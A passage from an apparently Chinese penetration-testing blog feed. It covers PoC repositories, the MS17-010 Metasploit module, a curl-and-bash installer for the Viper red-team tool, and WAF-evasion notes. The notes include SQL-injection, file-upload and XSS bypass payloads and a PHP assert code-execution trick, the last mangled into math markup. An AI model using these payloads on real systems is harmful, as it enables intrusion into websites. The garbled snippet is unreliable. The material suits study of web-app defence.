&lt;h4 id=&#34;自动收集cve的poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#自动收集cve的poc&#34;&gt;#&lt;/a&gt; 自动收集 cve 的 poc&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;PoC-in-GitHub&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL25vbWktc2VjL1BvQy1pbi1HaXRIdWI=&#34;&gt;https://github.com/nomi-sec/PoC-in-GitHub&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;可以根据漏洞的 cve 编号进行筛选查看漏洞的 poc，更新较快，需保持同步更新&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;exploitdb&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0ZGI=&#34;&gt;https://github.com/offensive-security/exploitdb&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;searchsploit 是集成国外 exploit-db 平台的漏洞库，拥有丰富的漏洞利用内容&lt;/p&gt;
&lt;h4 id=&#34;监控cnvd和cve漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#监控cnvd和cve漏洞&#34;&gt;#&lt;/a&gt; 监控 cnvd 和 cve 漏洞&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;cnvd 监控：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3R0b255cy9TY3JhcHktQ1ZFLUNOVkQ=&#34;&gt;https://github.com/ttonys/Scrapy-CVE-CNVD&lt;/span&gt;&lt;br&gt;
 特点：不更新了，不是很好&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cve 监控：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ljZHhzYi9Qb2NPckV4cF9pbl9HaXRodWI=&#34;&gt;https://github.com/ycdxsb/PocOrExp_in_Github&lt;/span&gt;&lt;br&gt;
 特点：更新比较频繁，会抓取 github 上所有 cve 项目地址&lt;/p&gt;
&lt;h4 id=&#34;msf漏洞使用说明&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf漏洞使用说明&#34;&gt;#&lt;/a&gt; msf 漏洞使用说明&lt;/h4&gt;
&lt;p&gt;漏洞利用数据库:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucmFwaWQ3LmNvbS9kYi9tb2R1bGVzL2F1eGlsaWFyeS9hZG1pbi9zbWIvbXMxN18wMTBfY29tbWFuZC8=&#34;&gt;https://www.rapid7.com/db/modules/auxiliary/admin/smb/ms17_010_command/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;该模块将利用具有 MS17-010 漏洞的 SMB 来实现 write-what-where 原语。 然后，这将用于以管理员会话覆盖连接会话信息。从那里，正常的 psexec 命 令执行完成。利用 Transaction 和 WriteAndX 请求之间的类型混淆以及 Transaction 请求中的竞争条件，如 EternalRomance、EternalChampion 和 EternalSynergy 漏洞利用中所见。此漏洞利用链比 EternalBlue 漏洞利用更可靠， 但需要命名管道。&lt;/p&gt;
&lt;h4 id=&#34;viper使用说明&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#viper使用说明&#34;&gt;#&lt;/a&gt; viper 使用说明&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;viper 基本介绍&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Viper (炫彩蛇) 是一款图形化内网渗透工具，将内网渗透过程中常用的战术及 技术进行模块化及武器化；集成杀软绕过，内网隧道，文件管理，命令行等基础功 能；当前已集成 70 + 个模块，覆盖初始访问 / 持久化 / 权限提升 / 防御绕过 / 凭证访问 / 信息收集 / 横向移动等大类；目标是帮助红队工程师提高攻击效率，简化操作，降 低技术门槛；支持在浏览器中运行原生 msfconsole, 且支持多人协作。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;工具使用地址&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;工具地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/FunnyWolf/Viper&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装手册&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.yuque.com/vipersec/help/rggacz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;一键安装&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sysctl -w vm.max_map_count=262144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -o f8x https://f8x.io/ # wget -O f8x https://f8x.io/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash f8x -viper&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/7%20waf%E6%94%BB%E9%98%B2/</id>
        <title>XD22 7 Waf 攻防</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/7%20waf%E6%94%BB%E9%98%B2/"/>
        <content type="html">&lt;h3 id=&#34;有waf时的信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#有waf时的信息收集&#34;&gt;#&lt;/a&gt; 有 waf 时的信息收集&lt;/h3&gt;
&lt;h4 id=&#34;信息收集拦截对抗&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集拦截对抗&#34;&gt;#&lt;/a&gt; 信息收集拦截对抗&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;信息收集常见检测：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;脚本或工具速度流量快&lt;/p&gt;
&lt;p&gt;脚本或工具的指纹被识别&lt;/p&gt;
&lt;p&gt;脚本或工具的检测 Payload&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;信息收集常见方法：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;延迟：解决请求过快封 IP 的情况&lt;/p&gt;
&lt;p&gt;代理池：在确保速度的情况下解决请求过快封 IP 的拦截&lt;/p&gt;
&lt;p&gt;白名单：模拟白名单模拟 WAF 授权测试，解决速度及测试拦截，换大型网站爬虫 UA&lt;/p&gt;
&lt;p&gt;模拟用户：模拟真实用户数据包请求探针，解决 WAF 指纹识别&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;被动扫描方式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;黑暗引擎：Fofa Quake Shodan zoomeye 0.zone 等&lt;/p&gt;
&lt;p&gt;其他接口：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL2JvdW50eXRpcHMucGhwP2dldGluZm8=&#34;&gt;https://forum.ywhack.com/bountytips.php?getinfo&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;信息收集脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集脚本&#34;&gt;#&lt;/a&gt; 信息收集脚本&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Python 自定义 header 目录扫描&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;目录扫描&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;headers=&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Connection&amp;#x27;: &amp;#x27;keep-alive&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Cache-Control&amp;#x27;: &amp;#x27;max-age=0&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Upgrade-Insecure-Requests&amp;#x27;: &amp;#x27;1&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;User-Agent&amp;#x27;: &amp;#x27;Mozilla/0 (Windows NT 0; Win64; x64) AppleWebKit/536 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/536&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Sec-Fetch-Dest&amp;#x27;: &amp;#x27;document&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Accept&amp;#x27;: &amp;#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Sec-Fetch-Site&amp;#x27;: &amp;#x27;none&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Sec-Fetch-Mode&amp;#x27;: &amp;#x27;navigate&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Sec-Fetch-User&amp;#x27;: &amp;#x27;?1&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Accept-Encoding&amp;#x27;: &amp;#x27;gzip, deflate, br&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Accept-Language&amp;#x27;: &amp;#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;Cookie&amp;#x27;: &amp;#x27;*&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; for paths in open(&amp;#x27;php_b.txt&amp;#x27;,encoding=&amp;#x27;utf-8&amp;#x27;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   url=&amp;#x27;http://www.testxiaodi.fun/&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   paths=paths.replace(&amp;#x27;\n&amp;#x27;,&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   urls=url+paths&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   proxy = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#x27;http&amp;#x27;: &amp;#x27;tps68kdlapi.com:15818&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     code=requests.get(urls,headers=headers,proxies=proxy).status_code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     print (urls+&amp;#x27;|&amp;#x27;+str(code))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     if code== 200 or code== 403 :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       print (urls+&amp;#x27;|&amp;#x27;+str(code))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   except Exception as err:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     print(&amp;#x27;connecting error&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     time.sleep(3)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;使用工具代理流量扫描&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过快代理买一个临时代理设置，可以在 Awvs/Xray/Goby 等工具上直接使用 代理，或者相关工具需要修改配置文件设置代理，也可以用 proxifier 建立规则， 代理流量至自己购买的代理，将进程的流量进行中转。&lt;/p&gt;
&lt;p&gt;proxifier 需要设置规则的进程，通过软件的属性定位到文件所在的位置， 复制文件的可执行程序，或通过任务管理器来找到当前运行的此软件的进程。&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用拦截对抗&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞利用拦截对抗&#34;&gt;#&lt;/a&gt; 漏洞利用拦截对抗&lt;/h3&gt;
&lt;h4 id=&#34;sql注入利用绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入利用绕过&#34;&gt;#&lt;/a&gt; sql 注入利用绕过&lt;/h4&gt;
&lt;p&gt;参考地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3V0ZS1wdWxpL3AvMTExNDY2aHRtbA==&#34;&gt;https://www.cnblogs.com/cute-puli/p/111466html&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关键字替换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xMDA6ODA4MS9zcWxpbGFicy9MZXNzLTIvP2lkPTE=&#34;&gt;http://192.168.0.100:8081/sqlilabs/Less-2/?id=1&lt;/span&gt; like 1&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xMDA6ODA4MS9zcWxpbGFicy9MZXNzLTIvP2lkPTE=&#34;&gt;http://192.168.0.100:8081/sqlilabs/Less-2/?id=1&lt;/span&gt; like 12&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;更换提交方式：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;POST id=-1 union select 1,2,3–+&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;模拟文件上传 传递数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过 burp 的右键功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分块传输&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更改数据请求格式 ：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2MwbnkxL2NodW5rZWQtY29kaW5nLWNvbnZlcnRlcg==&#34;&gt;https://github.com/c0ny1/chunked-coding-converter&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HPP 参数污染&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;id=1/&amp;amp;id=-1%20union%20select%201,2,3%23*/&lt;/p&gt;
&lt;h4 id=&#34;文件上传拦截绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传拦截绕过&#34;&gt;#&lt;/a&gt; 文件上传拦截绕过&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;符号干扰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;filename=a.php&lt;br&gt;
filename=&amp;quot;a.php&lt;br&gt;
;filename=“a.php”&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;%00 干扰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;filename=“a.php%00”&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;垃圾数据溢出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;无限 filename;filename=“a.php”&lt;br&gt;
filename==“a.php”&lt;br&gt;
filename=“name=&#39;uploadfile.php”&lt;br&gt;
filename=“Content-Disposition: form-data.php”&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;换行解析&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;filename==“&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2EucGg=&#34;&gt;a.ph&lt;/span&gt;&lt;br&gt;
p”&lt;/p&gt;
&lt;h4 id=&#34;xss拦截绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss拦截绕过&#34;&gt;#&lt;/a&gt; xss 拦截绕过&lt;/h4&gt;
&lt;p&gt;工具链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==&#34;&gt;https://github.com/s0md3v/XSStrike&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;使用方法：&lt;br&gt;
 &lt;code&gt;python xsstrike.py -u &amp;quot;http://xx/xss__get.php?message=1&amp;amp; submit=submit&amp;quot; --proxy&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;其他绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他绕过&#34;&gt;#&lt;/a&gt; 其他绕过&lt;/h4&gt;
&lt;p&gt;采用参数替换绕过:txt=&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;msup&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mrow&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;′&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;′&lt;/mo&gt;&lt;/mrow&gt;&lt;/msup&gt;&lt;msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;y=str_replace(&amp;#x27;x&amp;#x27;,&amp;#x27;&amp;#x27;,&amp;#x27;pxhpxinxfo()&amp;#x27;);assert(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; 